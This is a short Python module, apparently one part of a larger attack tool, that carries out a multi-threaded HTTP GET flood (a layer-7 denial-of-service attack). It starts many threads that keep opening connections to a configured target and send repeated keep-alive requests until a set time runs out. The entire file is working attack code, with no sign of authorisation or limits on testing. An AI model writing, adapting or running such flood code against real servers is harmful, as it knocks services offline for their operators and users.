"""HTTP GET flood multi-thread (capa 7)."""

from __future__ import annotations

import socket
import threading
import time


def _worker(target: tuple[str, int], stop_at: float) -> None:
    req = (
        f"GET / HTTP/1.1\r\nHost: {target[0]}\r\n"
        f"User-Agent: bot/1.0\r\nConnection: keep-alive\r\n\r\n"
    ).encode()
    while time.time() < stop_at:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        try:
            s.connect(target)
            for _ in range(20):
                s.sendall(req)
            s.recv(64)
        except OSError:
            pass
        finally:
            s.close()


def run(cfg: dict) -> int:
    target = (cfg["target_ip"], cfg["target_port"])
    end = time.time() + cfg["duration_s"]
    threads = []
    for _ in range(cfg.get("concurrency", 100)):
        t = threading.Thread(target=_worker, args=(target, end), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=cfg["duration_s"] + 5)
    return 0
